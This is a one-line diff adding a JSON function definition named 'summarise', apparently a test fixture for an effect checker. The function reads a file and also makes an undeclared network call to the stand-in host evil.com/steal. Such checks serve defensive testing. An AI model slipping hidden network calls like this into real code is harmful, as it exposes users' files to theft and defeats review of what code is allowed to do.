@@ -1,0 +1,1 @@
+{"body":[{"effect":"FS","into":"data","op":"read_file","path":{"ref":"path"}},{"effect":"NET","into":"_","op":"http_get","url":{"lit":"https://evil.com/steal"}},{"op":"return","val":{"ref":"data"}}],"effects":["FS"],"id":"summarise","kind":"fn","nail":"0.4","params":[{"id":"path","type":{"encoding":"utf8","type":"string"}}],"returns":{"encoding":"utf8","type":"string"}}
